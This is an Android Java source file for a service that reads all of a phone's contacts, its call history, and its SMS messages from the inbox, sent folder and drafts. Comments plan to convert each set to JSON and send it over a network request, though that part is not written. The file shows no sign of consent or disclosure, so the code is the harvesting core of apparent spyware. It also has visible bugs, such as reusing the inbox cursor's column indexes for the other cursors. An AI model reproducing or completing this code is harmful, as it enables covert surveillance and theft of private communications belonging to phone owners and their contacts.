package com.sarl.monify;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.support.annotation.Nullable;
import android.util.Log;

import com.sarl.monify.dataClasses.CallRecord;
import com.sarl.monify.dataClasses.Contact;
import com.sarl.monify.dataClasses.Sms;

import java.util.ArrayList;

/**
 * Created by knightshade on 11/3/17.
 */

public class DataUploadService extends IntentService {

    private ContentResolver cr;
    private String dataUploadService = "DATA_UPLOAD_SERVICE";
    private Uri inboxUri = Uri.parse("content://sms/inbox");
    private Uri outboxUri = Uri.parse("content://sms/sent");
    private Uri draftUri = Uri.parse("content://sms/draft");
    private String[] smsColumns = {"_id", "address", "body", "date"};

    public DataUploadService(){
        super("DataUploadService");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        Log.d(dataUploadService, "onHandleIntent executing.");
        cr = getContentResolver();
        uploadContact();
        uploadCallRecords();
        uploadSms();
    }

    private void uploadContact(){
        ArrayList<Contact> contactArrayList = new ArrayList<>();
        Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                null, null, null);
        while(c.moveToNext()){
            String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String number = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            contactArrayList.add(new Contact(name, number));
        }

        c.close();

        Log.d("CONTACT", contactArrayList.get(0).toString() + contactArrayList.size());
        // Make json array and add each object
        // JsonArray to string
        // Network request
    }

    private void uploadCallRecords(){
        ArrayList<CallRecord> callRecordArrayList = new ArrayList<>();
        String[] projection = new String[] {CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};

        try{
            Cursor c = cr.query(CallLog.Calls.CONTENT_URI, projection, null,
                    null, CallLog.Calls.DATE + " DESC");

            if (c.getCount() > 0)
            {
                c.moveToFirst();
                do{

                    String number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                    String dateandtime = c.getString(c.getColumnIndex(CallLog.Calls.DATE));
                    String duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));
                    callRecordArrayList.add( new CallRecord(number, dateandtime, duration));

                }while(c.moveToNext());
                c.close();

            }
            Log.d("CALL_RECORDS", callRecordArrayList.get(0).toString() + callRecordArrayList.size());
        }catch (SecurityException e){
            Log.d("CALL_INFO", "Security Exception occured.");
        }

        // Make json array and add each object
        // JsonArray to string
        // Network request
    }

    private void uploadSms(){
        Log.d("SMS", "Entered into SMS");
        ArrayList<Sms> smsArrayList = new ArrayList<>();
        Cursor cinbox = cr.query(inboxUri, smsColumns, null, null, null);
        Cursor coutbox = cr.query(outboxUri, smsColumns, null, null, null);
        Cursor cdraft = cr.query(draftUri, smsColumns, null, null, null);
        Log.d("SMS", "Cursor end reached");
        while (cinbox.moveToNext()) {
            Log.d("SMS", "INBOX");
            String number = cinbox.getString(cinbox.getColumnIndex(Telephony.Sms.ADDRESS));
            String message = cinbox.getString(cinbox.getColumnIndex(Telephony.Sms.BODY));
            String timestamp = cinbox.getString(cinbox.getColumnIndex(Telephony.Sms.DATE));
            smsArrayList.add(new Sms(number, message, timestamp));
        }

        while (coutbox.moveToNext()) {
            Log.d("SMS", "OUTBOX");
            String number = coutbox.getString(cinbox.getColumnIndex(Telephony.Sms.ADDRESS));
            String message = coutbox.getString(cinbox.getColumnIndex(Telephony.Sms.BODY));
            String timestamp = coutbox.getString(cinbox.getColumnIndex(Telephony.Sms.DATE));
            smsArrayList.add(new Sms(number, message, timestamp));
        }

        while (cdraft.moveToNext()) {
            Log.d("SMS", "DRAFT");
            String number = cdraft.getString(cinbox.getColumnIndex(Telephony.Sms.ADDRESS));
            String message = cdraft.getString(cinbox.getColumnIndex(Telephony.Sms.BODY));
            String timestamp = cdraft.getString(cinbox.getColumnIndex(Telephony.Sms.DATE));
            smsArrayList.add(new Sms(number, message, timestamp));
        }

        cinbox.close();
        coutbox.close();
        cdraft.close();

        Log.d("SMS", smsArrayList.get(0).toString() + smsArrayList.size());
        // Make json array and add each object
        // JsonArray to string
        // Network request
    }
}
